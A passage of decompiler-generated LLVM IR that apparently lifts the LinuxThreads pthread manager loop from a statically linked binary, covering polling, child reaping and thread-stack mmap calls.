  store i32 %v2_8055f7b, i32* %stack_var_-364, align 4
  %v1_8055fb9 = call i32 @__GI_sigdelset(i32 %v2_8055f7b)
  store i32 %v1_8055fb9, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8055fc1

dec_label_pc_8055fc1:                             ; preds = %dec_label_pc_8055fac, %entry, %dec_label_pc_8055fb5
  store i32 %v2_8055f7b, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-364, align 4
  %v3_8055fce = bitcast i32* %stack_var_-152 to %_TYPEDEF_sigset_t*
  %v4_8055fce = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_8055fce, i32 0)
  %v0_8055fd3 = load i32, i32* bitcast (i32** @global_var_8073c80.657 to i32*), align 128
  store i32 %v0_8055fd3, i32* %eax.global-to-local, align 4
  store i32 2, i32* @edi, align 4
  %v3_8055fd9 = load i32, i32* @global_var_8073c98.672, align 4
  store i32 %v3_8055fd9, i32* %stack_var_-364, align 4
  %v1_8055fdc = call i32 @__pthread_manager_adjust_prio(i32 %v3_8055fd9)
  store i32 %v1_8055fdc, i32* %eax.global-to-local, align 4
  %v2_8055fea = ptrtoint i32* %stack_var_-300 to i32
  br label %dec_label_pc_8055fe4

dec_label_pc_8055fe4:                             ; preds = %dec_label_pc_8056001, %dec_label_pc_8055fc1
  store i32 %v2_8055fea, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* %stack_var_-364, align 4
  %v3_8055ff6 = call i32 @__libc_read(i32 %arg1, i32 %v2_8055fea, i32 148)
  %v1_8055ffe = add i32 %v3_8055ff6, 1
  %v8_8055ffe = icmp eq i32 %v1_8055ffe, 0
  store i32 %v1_8055ffe, i32* %eax.global-to-local, align 4
  %v1_8055fff = icmp eq i1 %v8_8055ffe, false
  br i1 %v1_8055fff, label %dec_label_pc_805600b, label %dec_label_pc_8056001

dec_label_pc_8056001:                             ; preds = %dec_label_pc_8055fe4
  %v0_8056001 = load i32, i32* %stack_var_-364, align 4
  %v1_8056001 = call i32 @__errno_location(i32 %v0_8056001)
  store i32 %v1_8056001, i32* %eax.global-to-local, align 4
  %v1_8056006 = inttoptr i32 %v1_8056001 to i32*
  %v2_8056006 = load i32, i32* %v1_8056006, align 4
  %v11_8056006 = icmp eq i32 %v2_8056006, 4
  br i1 %v11_8056006, label %dec_label_pc_8055fe4, label %dec_label_pc_805600b

dec_label_pc_805600b:                             ; preds = %dec_label_pc_8056001, %dec_label_pc_8055fe4
  store i32 %arg1, i32* %edx.global-to-local, align 4
  %v4_8056033 = inttoptr i32 %arg1 to %pollfd*
  %v1_80564ef = inttoptr i32 %arg1 to i32*
  %v4_8056211 = inttoptr i32 %arg1 to i8*
  %v4_8056336 = inttoptr i32 %arg1 to i16*
  br label %dec_label_pc_8056023thread-pre-split

dec_label_pc_8056023thread-pre-split:             ; preds = %dec_label_pc_805657b, %dec_label_pc_805606d, %dec_label_pc_8056070, %dec_label_pc_805600b
  %v1_8056023.pr = load i32, i32* @esp, align 4
  br label %dec_label_pc_8056023

dec_label_pc_8056023:                             ; preds = %dec_label_pc_805607a, %dec_label_pc_80565b6, %dec_label_pc_8056023thread-pre-split
  %v1_8056023 = phi i32 [ %v1_8056023.pr, %dec_label_pc_8056023thread-pre-split ], [ %v1_8056091, %dec_label_pc_805607a ], [ %v1_80565b6, %dec_label_pc_80565b6 ]
  %v0_8056023 = load i32, i32* @ebx, align 4
  %v2_8056023 = add i32 %v1_8056023, -4
  %v3_8056023 = inttoptr i32 %v2_8056023 to i32*
  store i32 %v0_8056023, i32* %v3_8056023, align 4
  %v1_8056024 = add i32 %v1_8056023, -8
  %v2_8056024 = inttoptr i32 %v1_8056024 to i32*
  store i32 2000, i32* %v2_8056024, align 4
  %v1_8056029 = add i32 %v1_8056023, -12
  %v2_8056029 = inttoptr i32 %v1_8056029 to i32*
  store i32 1, i32* %v2_8056029, align 4
  %v1_805602b = add i32 %v1_8056023, 324
  store i32 %v1_805602b, i32* %eax.global-to-local, align 4
  %v2_8056032 = add i32 %v1_8056023, -16
  %v3_8056032 = inttoptr i32 %v2_8056032 to i32*
  store i32 %v1_805602b, i32* %v3_8056032, align 4
  %v2_8056033 = load i32, i32* %stack_var_-16, align 4
  %v5_8056033 = call i32 @__libc_poll(%pollfd* %v4_8056033, i32 1, i32 %v2_8056033)
  store i32 %v5_8056033, i32* %eax.global-to-local, align 4
  store i32 %v5_8056033, i32* @ebx, align 4
  %v1_805603a = call i32 @getppid(i32 %arg1)
  store i32 %v1_805603a, i32* %eax.global-to-local, align 4
  %v9_8056042 = icmp eq i32 %v1_805603a, 1
  %v1_8056045 = icmp eq i1 %v9_8056042, false
  br i1 %v1_8056045, label %dec_label_pc_8056055, label %dec_label_pc_8056047

dec_label_pc_8056047:                             ; preds = %dec_label_pc_8056023
  store i32 0, i32* @edx, align 4
  %v1_8056049 = and i32 %v1_805603a, -256
  %v2_8056049 = or i32 %v1_8056049, 9
  store i32 %v2_8056049, i32* @eax, align 4
  %v0_805604b = call i32 @pthread_kill_all_threads()
  br label %dec_label_pc_8056551

dec_label_pc_8056055:                             ; preds = %dec_label_pc_8056023
  %v0_8056055 = load i32, i32* @global_var_80784a0.662, align 32
  store i32 %v0_8056055, i32* %eax.global-to-local, align 4
  %v1_805605a = icmp eq i32 %v0_8056055, 0
  br i1 %v1_805605a, label %dec_label_pc_805606d, label %dec_label_pc_805605e

dec_label_pc_805605e:                             ; preds = %dec_label_pc_8056055
  store i32 0, i32* @global_var_80784a0.662, align 32
  %v0_8056068 = call i32 @pthread_reap_children()
  store i32 %v0_8056068, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805606d

dec_label_pc_805606d:                             ; preds = %dec_label_pc_8056055, %dec_label_pc_805605e
  %v0_805606d = load i32, i32* @ebx, align 4
  %v1_805606d = add i32 %v0_805606d, -1
  %v8_805606d = icmp eq i32 %v1_805606d, 0
  store i32 %v1_805606d, i32* @ebx, align 4
  %v1_805606e = icmp eq i1 %v8_805606d, false
  br i1 %v1_805606e, label %dec_label_pc_8056023thread-pre-split, label %dec_label_pc_8056070

dec_label_pc_8056070:                             ; preds = %dec_label_pc_805606d
  %v0_8056070 = load i32, i32* @esp, align 4
  %v1_8056070 = add i32 %v0_8056070, 330
  %v2_8056070 = inttoptr i32 %v1_8056070 to i8*
  %v3_8056070 = load i8, i8* %v2_8056070, align 1
  %v4_8056070 = urem i8 %v3_8056070, 2
  %v5_8056070 = icmp eq i8 %v4_8056070, 0
  br i1 %v5_8056070, label %dec_label_pc_8056023thread-pre-split, label %dec_label_pc_805607a

dec_label_pc_805607a:                             ; preds = %dec_label_pc_8056070
  %v0_805607a = load i32, i32* @ecx, align 4
  %v2_805607a = add i32 %v0_8056070, -4
  %v3_805607a = inttoptr i32 %v2_805607a to i32*
  store i32 %v0_805607a, i32* %v3_805607a, align 4
  %v1_805607b = add i32 %v0_8056070, -8
  %v2_805607b = inttoptr i32 %v1_805607b to i32*
  store i32 148, i32* %v2_805607b, align 4
  %v1_8056080 = add i32 %v0_8056070, 48
  store i32 %v1_8056080, i32* %ecx.global-to-local, align 4
  %v2_8056084 = add i32 %v0_8056070, -12
  %v3_8056084 = inttoptr i32 %v2_8056084 to i32*
  store i32 %v1_8056080, i32* %v3_8056084, align 4
  %v1_8056085 = add i32 %v0_8056070, 352
  %v2_8056085 = inttoptr i32 %v1_8056085 to i32*
  %v3_8056085 = load i32, i32* %v2_8056085, align 4
  %v5_8056085 = add i32 %v0_8056070, -16
  %v6_8056085 = inttoptr i32 %v5_8056085 to i32*
  store i32 %v3_8056085, i32* %v6_8056085, align 4
  %v2_805608c = load i32, i32* %stack_var_-16, align 4
  %v4_805608c = call i32 @__libc_read(i32 %arg1, i32 1, i32 %v2_805608c)
  store i32 %v4_805608c, i32* %eax.global-to-local, align 4
  %v0_8056091 = load i32, i32* @esp, align 4
  %v1_8056091 = add i32 %v0_8056091, 16
  %v1_8056094 = add i32 %v0_8056091, 68
  %v2_8056094 = inttoptr i32 %v1_8056094 to i32*
  %v3_8056094 = load i32, i32* %v2_8056094, align 4
  store i32 %v3_8056094, i32* %eax.global-to-local, align 4
  switch i32 %v1_8056023, label %dec_label_pc_8056023 [
    i32 0, label %dec_label_pc_80560a6
    i32 1, label %dec_label_pc_80564a3
    i32 2, label %dec_label_pc_80564f9
    i32 3, label %dec_label_pc_805655b
    i32 4, label %dec_label_pc_8056585
  ]

dec_label_pc_80560a6:                             ; preds = %dec_label_pc_805607a
  %v1_80560a6 = add i32 %v0_8056091, 64
  %v2_80560a6 = inttoptr i32 %v1_80560a6 to i32*
  %v3_80560a6 = load i32, i32* %v2_80560a6, align 4
  store i32 %v3_80560a6, i32* %eax.global-to-local, align 4
  %v1_80560aa = add i32 %v0_8056091, 72
  %v2_80560aa = inttoptr i32 %v1_80560aa to i32*
  %v3_80560aa = load i32, i32* %v2_80560aa, align 4
  store i32 %v3_80560aa, i32* @edi, align 4
  %v2_80560ae = add i32 %v0_8056091, 20
  %v3_80560ae = inttoptr i32 %v2_80560ae to i32*
  store i32 %v3_80560a6, i32* %v3_80560ae, align 4
  %v0_80560b2 = load i32, i32* %eax.global-to-local, align 4
  %v1_80560b2 = add i32 %v0_80560b2, 412
  %v2_80560b2 = inttoptr i32 %v1_80560b2 to i32*
  %v3_80560b2 = load i32, i32* %v2_80560b2, align 4
  store i32 %v3_80560b2, i32* %edx.global-to-local, align 4
  %v1_80560b8 = load i32, i32* @esp, align 4
  %v2_80560b8 = add i32 %v1_80560b8, 24
  %v3_80560b8 = inttoptr i32 %v2_80560b8 to i32*
  store i32 %v3_80560b2, i32* %v3_80560b8, align 4
  %v0_80560bc = load i32, i32* @esp, align 4
  %v1_80560bc = add i32 %v0_80560bc, 60
  %v2_80560bc = inttoptr i32 %v1_80560bc to i32*
  %v3_80560bc = load i32, i32* %v2_80560bc, align 4
  store i32 %v3_80560bc, i32* %edx.global-to-local, align 4
  %v0_80560c0 = load i32, i32* %eax.global-to-local, align 4
  %v1_80560c0 = add i32 %v0_80560c0, 20
  %v2_80560c0 = inttoptr i32 %v1_80560c0 to i32*
  %v3_80560c0 = load i32, i32* %v2_80560c0, align 4
  store i32 %v3_80560c0, i32* %ecx.global-to-local, align 4
  %v1_80560c3 = add i32 %v0_80560bc, 64
  %v2_80560c3 = inttoptr i32 %v1_80560c3 to i32*
  %v3_80560c3 = load i32, i32* %v2_80560c3, align 4
  store i32 %v3_80560c3, i32* %eax.global-to-local, align 4
  %v2_80560c7 = add i32 %v0_80560bc, 28
  %v3_80560c7 = inttoptr i32 %v2_80560c7 to i32*
  store i32 %v3_80560c0, i32* %v3_80560c7, align 4
  %v0_80560cb = load i32, i32* %eax.global-to-local, align 4
  %v1_80560cb = load i32, i32* @esp, align 4
  %v2_80560cb = add i32 %v1_80560cb, 32
  %v3_80560cb = inttoptr i32 %v2_80560cb to i32*
  store i32 %v0_80560cb, i32* %v3_80560cb, align 4
  %v0_80560cf = load i32, i32* %edx.global-to-local, align 4
  %v1_80560cf = load i32, i32* @esp, align 4
  %v2_80560cf = add i32 %v1_80560cf, 36
  %v3_80560cf = inttoptr i32 %v2_80560cf to i32*
  store i32 %v0_80560cf, i32* %v3_80560cf, align 4
  %v1_80560d3 = call i32 @__GI_getpagesize(i32 %arg1)
  store i32 %v1_80560d3, i32* %eax.global-to-local, align 4
  %v0_80560d8 = load i32, i32* @edi, align 4
  %v1_80560d8 = icmp eq i32 %v0_80560d8, 0
  store i32 %v1_80560d3, i32* @ebp, align 4
  br i1 %v1_80560d8, label %dec_label_pc_80560f6, label %dec_label_pc_80560de

dec_label_pc_80560de:                             ; preds = %dec_label_pc_80560a6
  %v1_80560de = add i32 %v0_80560d8, 4
  %v2_80560de = inttoptr i32 %v1_80560de to i32*
  %v3_80560de = load i32, i32* %v2_80560de, align 4
  %v4_80560de = icmp eq i32 %v3_80560de, 0
  br i1 %v4_80560de, label %dec_label_pc_80560f6, label %dec_label_pc_80560e4

dec_label_pc_80560e4:                             ; preds = %dec_label_pc_80560de
  %v0_80560e4 = call i32 @geteuid()
  store i32 %v0_80560e4, i32* %eax.global-to-local, align 4
  store i32 1, i32* @edx, align 4
  %v1_80560ee = icmp eq i32 %v0_80560e4, 0
  %v1_80560f0 = icmp eq i1 %v1_80560ee, false
  br i1 %v1_80560f0, label %dec_label_pc_8056493, label %dec_label_pc_80560f6

dec_label_pc_80560f6:                             ; preds = %dec_label_pc_80560e4, %dec_label_pc_80560de, %dec_label_pc_80560a6
  %v0_80560f6 = load i32, i32* @esp, align 4
  %v1_80560f6 = add i32 %v0_80560f6, 20
  %v2_80560f6 = inttoptr i32 %v1_80560f6 to i32*
  store i32 2, i32* %v2_80560f6, align 4
  %v0_80560fe81 = load i32, i32* @esp, align 4
  %v1_80560fe82 = add i32 %v0_80560fe81, 20
  %v2_80560fe83 = inttoptr i32 %v1_80560fe82 to i32*
  %v3_80560fe84 = load i32, i32* %v2_80560fe83, align 4
  %tmp103 = icmp ult i32 %v3_80560fe84, 1024
  br i1 %tmp103, label %dec_label_pc_805610c, label %dec_label_pc_805647c

dec_label_pc_805610c:                             ; preds = %dec_label_pc_80560f6, %dec_label_pc_80561ff
  %v3_80560fe91 = phi i32 [ %v3_80560fe, %dec_label_pc_80561ff ], [ %v3_80560fe84, %dec_label_pc_80560f6 ]
  %v0_80560fe90 = phi i32 [ %v0_80560fe, %dec_label_pc_80561ff ], [ %v0_80560fe81, %dec_label_pc_80560f6 ]
  %v2_8056110 = mul i32 %v3_80560fe91, 16
  store i32 %v2_8056110, i32* %eax.global-to-local, align 4
  %v1_8056113 = add i32 %v2_8056110, 134674600
  %v2_8056113 = inttoptr i32 %v1_8056113 to i32*
  %v3_8056113 = load i32, i32* %v2_8056113, align 8
  %v4_8056113 = icmp eq i32 %v3_8056113, 0
  %v1_805611a = icmp eq i1 %v4_8056113, false
  br i1 %v1_805611a, label %dec_label_pc_80561ff, label %dec_label_pc_8056120

dec_label_pc_8056120:                             ; preds = %dec_label_pc_805610c
  %v0_8056120 = load i32, i32* @global_var_807a620.650, align 32
  store i32 %v0_8056120, i32* %ecx.global-to-local, align 4
  %v0_8056126 = load i32, i32* @edi, align 4
  %v1_8056126 = icmp eq i32 %v0_8056126, 0
  br i1 %v1_8056126, label %dec_label_pc_8056152, label %dec_label_pc_805612a

dec_label_pc_805612a:                             ; preds = %dec_label_pc_8056120
  %v1_805612a = add i32 %v0_8056126, 24
  %v2_805612a = inttoptr i32 %v1_805612a to i32*
  %v3_805612a = load i32, i32* %v2_805612a, align 4
  %v4_805612a = icmp eq i32 %v3_805612a, 0
  br i1 %v4_805612a, label %dec_label_pc_8056152, label %dec_label_pc_8056130

dec_label_pc_8056130:                             ; preds = %dec_label_pc_805612a
  %v1_8056130 = add i32 %v0_8056126, 28
  %v2_8056130 = inttoptr i32 %v1_8056130 to i32*
  %v3_8056130 = load i32, i32* %v2_8056130, align 4
  store i32 %v3_8056130, i32* %edx.global-to-local, align 4
  %v1_8056137 = and i32 %v3_8056130, -4
  store i32 %v1_8056137, i32* %eax.global-to-local, align 4
  %v2_805613a = add i32 %v0_8056126, 32
  %v3_805613a = inttoptr i32 %v2_805613a to i32*
  %v4_805613a = load i32, i32* %v3_805613a, align 4
  %v5_805613a = sub i32 %v3_8056130, %v4_805613a
  store i32 %v5_805613a, i32* @ebp, align 4
  %v1_805613d = add i32 %v1_8056137, -480
  store i32 %v1_805613d, i32* @esi, align 4
  store i32 1, i32* @global_var_807e100.654, align 256
  br label %dec_label_pc_80561ed

dec_label_pc_8056152:                             ; preds = %dec_label_pc_805612a, %dec_label_pc_8056120
  %v1_8056152 = add i32 %v0_80560fe90, 40
  %v2_8056152 = inttoptr i32 %v1_8056152 to i32*
  store i32 2097152, i32* %v2_8056152, align 4
  %v0_805615a = load i32, i32* @esp, align 4
  %v1_805615a = add i32 %v0_805615a, 40
  %v2_805615a = inttoptr i32 %v1_805615a to i32*
  %v3_805615a = load i32, i32* %v2_805615a, align 4
  %v4_805615a = load i32, i32* @ebp, align 4
  %v5_805615a = sub i32 %v3_805615a, %v4_805615a
  store i32 %v5_805615a, i32* %v2_805615a, align 4
  %v0_805615e = load i32, i32* @edi, align 4
  %v1_805615e = icmp eq i32 %v0_805615e, 0
  br i1 %v1_805615e, label %dec_label_pc_8056152.dec_label_pc_8056177_crit_edge, label %dec_label_pc_8056162

dec_label_pc_8056152.dec_label_pc_8056177_crit_edge: ; preds = %dec_label_pc_8056152
  %v0_8056177.pre = load i32, i32* @esp, align 4
  %v0_8056183.pre.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8056177

dec_label_pc_8056162:                             ; preds = %dec_label_pc_8056152
  %v0_8056162 = load i32, i32* @ebp, align 4
  store i32 %v0_8056162, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v2_8056166 = add i32 %v0_805615e, 32
  %v3_8056166 = inttoptr i32 %v2_8056166 to i32*
  %v4_8056166 = load i32, i32* %v3_8056166, align 4
  %v5_8056166 = add i32 %v0_8056162, -1
  %v1_8056169 = add i32 %v5_8056166, %v4_8056166
  %tmp49 = urem i32 %v1_8056169, %v0_8056162
  store i32 %tmp49, i32* @edx, align 4
  %v4_805616c = sub i32 %v1_8056169, %tmp49
  store i32 %v4_805616c, i32* %eax.global-to-local, align 4
  store i32 %v4_805616c, i32* @ebx, align 4
  %v0_8056171 = load i32, i32* @esp, align 4
  %v1_8056171 = add i32 %v0_8056171, 40
  %v2_8056171 = inttoptr i32 %v1_8056171 to i32*
  %v3_8056171 = load i32, i32* %v2_8056171, align 4
  %v10_8056171 = icmp ult i32 %v3_8056171, %v4_805616c
  %v1_8056175 = icmp eq i1 %v10_8056171, false
  br i1 %v1_8056175, label %dec_label_pc_805617b, label %dec_label_pc_8056177

dec_label_pc_8056177:                             ; preds = %dec_label_pc_8056152.dec_label_pc_8056177_crit_edge, %dec_label_pc_8056162
  %v0_8056183.pre = phi i32 [ %v0_8056183.pre.pre, %dec_label_pc_8056152.dec_label_pc_8056177_crit_edge ], [ %tmp49, %dec_label_pc_8056162 ]
  %v0_8056177 = phi i32 [ %v0_8056177.pre, %dec_label_pc_8056152.dec_label_pc_8056177_crit_edge ], [ %v0_8056171, %dec_label_pc_8056162 ]
  %v1_8056177 = add i32 %v0_8056177, 40
  %v2_8056177 = inttoptr i32 %v1_8056177 to i32*
  %v3_8056177 = load i32, i32* %v2_8056177, align 4
  store i32 %v3_8056177, i32* @ebx, align 4
  br label %dec_label_pc_805617b

dec_label_pc_805617b:                             ; preds = %dec_label_pc_8056162, %dec_label_pc_8056177
  %v0_8056183 = phi i32 [ %tmp49, %dec_label_pc_8056162 ], [ %v0_8056183.pre, %dec_label_pc_8056177 ]
  %v1_8056183 = phi i32 [ %v0_8056171, %dec_label_pc_8056162 ], [ %v0_8056177, %dec_label_pc_8056177 ]
  %v2_805617b = add i32 %v1_8056183, 20
  %v3_805617b = inttoptr i32 %v2_805617b to i32*
  %v4_805617b = load i32, i32* %v3_805617b, align 4
  %v6_805617b = mul i32 %v4_805617b, -2097152
  store i32 %v6_805617b, i32* %eax.global-to-local, align 4
  %v2_8056183 = add i32 %v1_8056183, -4
  %v3_8056183 = inttoptr i32 %v2_8056183 to i32*
  store i32 %v0_8056183, i32* %v3_8056183, align 4
  %v0_8056184 = load i32, i32* @edx, align 4
  %v2_8056184 = add i32 %v1_8056183, -8
  %v3_8056184 = inttoptr i32 %v2_8056184 to i32*
  store i32 %v0_8056184, i32* %v3_8056184, align 4
  %v0_8056185 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8056185 = load i32, i32* %eax.global-to-local, align 4
  %v2_8056185 = add i32 %v0_8056185, 2096672
  %v3_8056185 = add i32 %v2_8056185, %v1_8056185
  store i32 %v3_8056185, i32* @esi, align 4
  %v0_805618c = load i32, i32* @global_var_807c8d0.673, align 16
  %v2_8056191 = mul i32 %v0_805618c, 4
  store i32 %v2_8056191, i32* %eax.global-to-local, align 4
  %v2_8056196 = sub i32 %v3_8056185, %v2_8056191
  store i32 %v2_8056196, i32* %ecx.global-to-local, align 4
  %v1_8056198 = add i32 %v1_8056183, -12
  %v2_8056198 = inttoptr i32 %v1_8056198 to i32*
  store i32 0, i32* %v2_8056198, align 4
  %v1_805619a = add i32 %v1_8056183, -16
  %v2_805619a = inttoptr i32 %v1_805619a to i32*
  store i32 -1, i32* %v2_805619a, align 4
  %v1_805619c = add i32 %v1_8056183, -20
  %v2_805619c = inttoptr i32 %v1_805619c to i32*
  store i32 306, i32* %v2_805619c, align 4
  %v1_80561a1 = add i32 %v1_8056183, -24
  %v2_80561a1 = inttoptr i32 %v1_80561a1 to i32*
  store i32 7, i32* %v2_80561a1, align 4
  %v0_80561a3 = load i32, i32* %eax.global-to-local, align 4
  %v2_80561a3 = add i32 %v1_8056183, -28
  %v3_80561a3 = inttoptr i32 %v2_80561a3 to i32*
  store i32 %v0_80561a3, i32* %v3_80561a3, align 4
  %v0_80561a4 = load i32, i32* %ecx.global-to-local, align 4
  %v1_80561a6 = add i32 %v0_80561a4, 480
  store i32 %v1_80561a6, i32* %eax.global-to-local, align 4
  %v2_80561ab = add i32 %v1_8056183, -32
  %v3_80561ab = inttoptr i32 %v2_80561ab to i32*
  store i32 %v1_80561a6, i32* %v3_80561ab, align 4
  %v2_80561ac = load i32, i32* %stack_var_-16, align 4
  %v9_80561ac = call i32 @mmap(i32 %arg1, i32 1, i32 %v2_80561ac, i32 %v0_8055f5f, i32 %v0_8055f5e, i32 %v0_8055f5d, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_80561b1 = load i32, i32* @esp, align 4
  %v1_80561b1 = add i32 %v0_80561b1, 32
  %v1_80561b4 = add i32 %v9_80561ac, 1
  %v8_80561b4 = icmp eq i32 %v1_80561b4, 0
  store i32 %v1_80561b4, i32* %eax.global-to-local, align 4
  br i1 %v8_80561b4, label %dec_label_pc_80561ff, label %dec_label_pc_80561b7

dec_label_pc_80561b7:                             ; preds = %dec_label_pc_805617b
  %v0_80561b7 = load i32, i32* @esi, align 4
  %v1_80561b9 = load i32, i32* @ebx, align 4
  %v2_80561b9 = sub i32 %v0_80561b7, %v1_80561b9
  store i32 %v2_80561b9, i32* %eax.global-to-local, align 4
  %v2_80561bb = add i32 %v0_80561b1, 72
  %v3_80561bb = inttoptr i32 %v2_80561bb to i32*
  %v4_80561bb = load i32, i32* %v3_80561bb, align 4
  %v15_80561bb = icmp eq i32 %v1_80561b9, %v4_80561bb
  %v1_80561bf = add i32 %v2_80561b9, 480
  store i32 %v1_80561bf, i32* @ebp, align 4
  br i1 %v15_80561bb, label %dec_label_pc_80561ed, label %dec_label_pc_80561c7

dec_label_pc_80561c7:                             ; preds = %dec_label_pc_80561b7
  %v0_80561c7 = load i32, i32* @edi, align 4
  %v1_80561c7 = add i32 %v0_80561c7, 20
  %v2_80561c7 = inttoptr i32 %v1_80561c7 to i32*
  %v3_80561c7 = load i32, i32* %v2_80561c7, align 4
  store i32 %v3_80561c7, i32* %eax.global-to-local, align 4
  %v2_80561cc = sub i32 %v1_80561bf, %v3_80561c7
  store i32 %v2_80561cc, i32* %edx.global-to-local, align 4
  %v2_80561ce = add i32 %v0_80561b1, 40
  %v3_80561ce = inttoptr i32 %v2_80561ce to i32*
  store i32 %v3_80561c7, i32* %v3_80561ce, align 4
  %v0_80561d2 = load i32, i32* %edx.global-to-local, align 4
  %v1_80561d2 = load i32, i32* @esp, align 4
  %v2_80561d2 = add i32 %v1_80561d2, 12
  %v3_80561d2 = inttoptr i32 %v2_80561d2 to i32*
  store i32 %v0_80561d2, i32* %v3_80561d2, align 4
  %v0_80561d6 = load i32, i32* %ecx.global-to-local, align 4
  %v1_80561d6 = load i32, i32* @esp, align 4
  %v2_80561d6 = add i32 %v1_80561d6, -4
  %v3_80561d6 = inttoptr i32 %v2_80561d6 to i32*
  store i32 %v0_80561d6, i32* %v3_80561d6, align 4
  %v0_80561d7 = load i32, i32* %ecx.global-to-local, align 4
  %v2_80561d7 = add i32 %v1_80561d6, -8
  %v3_80561d7 = inttoptr i32 %v2_80561d7 to i32*
  store i32 %v0_80561d7, i32* %v3_80561d7, align 4
  %v1_80561d8 = add i32 %v1_80561d6, -12
  %v2_80561d8 = inttoptr i32 %v1_80561d8 to i32*
  store i32 0, i32* %v2_80561d8, align 4
  %v1_80561da = add i32 %v1_80561d6, -16
  %v2_80561da = inttoptr i32 %v1_80561da to i32*
  store i32 -1, i32* %v2_80561da, align 4
  %v1_80561dc = add i32 %v1_80561d6, -20
  %v2_80561dc = inttoptr i32 %v1_80561dc to i32*
  store i32 16, i32* %v2_80561dc, align 4
  %v1_80561de = add i32 %v1_80561d6, -24
  %v2_80561de = inttoptr i32 %v1_80561de to i32*
  store i32 0, i32* %v2_80561de, align 4
  %v0_80561e0 = load i32, i32* %eax.global-to-local, align 4
  %v2_80561e0 = add i32 %v1_80561d6, -28
  %v3_80561e0 = inttoptr i32 %v2_80561e0 to i32*
  store i32 %v0_80561e0, i32* %v3_80561e0, align 4
  %v0_80561e1 = load i32, i32* %edx.global-to-local, align 4
  %v2_80561e1 = add i32 %v1_80561d6, -32
  %v3_80561e1 = inttoptr i32 %v2_80561e1 to i32*
  store i32 %v0_80561e1, i32* %v3_80561e1, align 4
  %v2_80561e2 = load i32, i32* %stack_var_-16, align 4
  %v9_80561e2 = call i32 @mmap(i32 %arg1, i32 1, i32 %v2_80561e2, i32 %v0_8055f5f, i32 %v0_8055f5e, i32 %v0_8055f5d, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_80561e7 = load i32, i32* @esp, align 4
  %v1_80561e7 = add i32 %v0_80561e7, 32
  %v1_80561ea = add i32 %v9_80561e2, 1
  %v8_80561ea = icmp eq i32 %v1_80561ea, 0
  store i32 %v1_80561ea, i32* %eax.global-to-local, align 4
  %v1_80561eb = icmp eq i1 %v8_80561ea, false
  br i1 %v1_80561eb, label %dec_label_pc_8056208, label %dec_label_pc_80561ed

dec_label_pc_80561ed:                             ; preds = %dec_label_pc_80561c7, %dec_label_pc_80561b7, %dec_label_pc_8056130
  %v0_80561ed = phi i32 [ %v1_80561e7, %dec_label_pc_80561c7 ], [ %v1_80561b1, %dec_label_pc_80561b7 ], [ %v0_80560fe90, %dec_label_pc_8056130 ]
  %v1_80561ed = add i32 %v0_80561ed, 12
  %v2_80561ed = inttoptr i32 %v1_80561ed to i32*
  store i32 0, i32* %v2_80561ed, align 4
  %v0_80561f5 = load i32, i32* @esp, align 4
  %v1_80561f5 = add i32 %v0_80561f5, 8
  %v2_80561f5 = inttoptr i32 %v1_80561f5 to i32*
  store i32 0, i32* %v2_80561f5, align 4
  %v1_8056208.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8056208

dec_label_pc_80561ff:                             ; preds = %dec_label_pc_805617b, %dec_label_pc_805610c
  %v17_80561ff = phi i32 [ %v1_80561b1, %dec_label_pc_805617b ], [ %v0_80560fe90, %dec_label_pc_805610c ]
  %v1_80561ff = add i32 %v17_80561ff, 20
  %v2_80561ff = inttoptr i32 %v1_80561ff to i32*
  %v3_80561ff = load i32, i32* %v2_80561ff, align 4
  %v4_80561ff = add i32 %v3_80561ff, 1
  store i32 %v4_80561ff, i32* %v2_80561ff, align 4
  %v0_80560fe = load i32, i32* @esp, align 4
  %v1_80560fe = add i32 %v0_80560fe, 20
  %v2_80560fe = inttoptr i32 %v1_80560fe to i32*
  %v3_80560fe = load i32, i32* %v2_80560fe, align 4
  %tmp104 = icmp ult i32 %v3_80560fe, 1024
  br i1 %tmp104, label %dec_label_pc_805610c, label %dec_label_pc_805647c

dec_label_pc_8056208:                             ; preds = %dec_label_pc_80561c7, %dec_label_pc_80561ed
  %v1_8056208 = phi i32 [ %v1_80561e7, %dec_label_pc_80561c7 ], [ %v1_8056208.pre, %dec_label_pc_80561ed ]
  %v0_8056208 = load i32, i32* @ebx, align 4
  %v2_8056208 = add i32 %v1_8056208, -4
  %v3_8056208 = inttoptr i32 %v2_8056208 to i32*
  store i32 %v0_8056208, i32* %v3_8056208, align 4
  %v1_8056209 = add i32 %v1_8056208, -8
  %v2_8056209 = inttoptr i32 %v1_8056209 to i32*
  store i32 480, i32* %v2_8056209, align 4
  %v1_805620e = add i32 %v1_8056208, -12
  %v2_805620e = inttoptr i32 %v1_805620e to i32*
  store i32 0, i32* %v2_805620e, align 4
  %v0_8056210 = load i32, i32* @esi, align 4
  %v2_8056210 = add i32 %v1_8056208, -16
  %v3_8056210 = inttoptr i32 %v2_8056210 to i32*
  store i32 %v0_8056210, i32* %v3_8056210, align 4
  %v2_8056211 = load i32, i32* %stack_var_-16, align 4
  %v5_8056211 = call i32 @__GI_memset(i8* %v4_8056211, i32 1, i32 %v2_8056211)
  %v0_8056216 = load i32, i32* @global_var_80738a0.666, align 32
  %v1_805621b = add i32 %v0_8056216, 1
  %v0_805621c = load i32, i32* @esp, align 4
  store i32 %v1_805621b, i32* @global_var_80738a0.666, align 32
  %v0_8056224 = load i32, i32* @global_var_80784a8.674, align 8
  %v1_8056229 = add i32 %v0_8056224, 1024
  store i32 %v1_8056229, i32* %eax.global-to-local, align 4
  %v0_805622e = load i32, i32* @esi, align 4
  store i32 %v0_805622e, i32* @ebx, align 4
  store i32 %v1_8056229, i32* @global_var_80784a8.674, align 8
  %v2_8056235 = add i32 %v0_805621c, 36
  %v3_8056235 = inttoptr i32 %v2_8056235 to i32*
  %v4_8056235 = load i32, i32* %v3_8056235, align 4
  %v5_8056235 = add i32 %v4_8056235, %v1_8056229
  store i32 %v5_8056235, i32* %eax.global-to-local, align 4
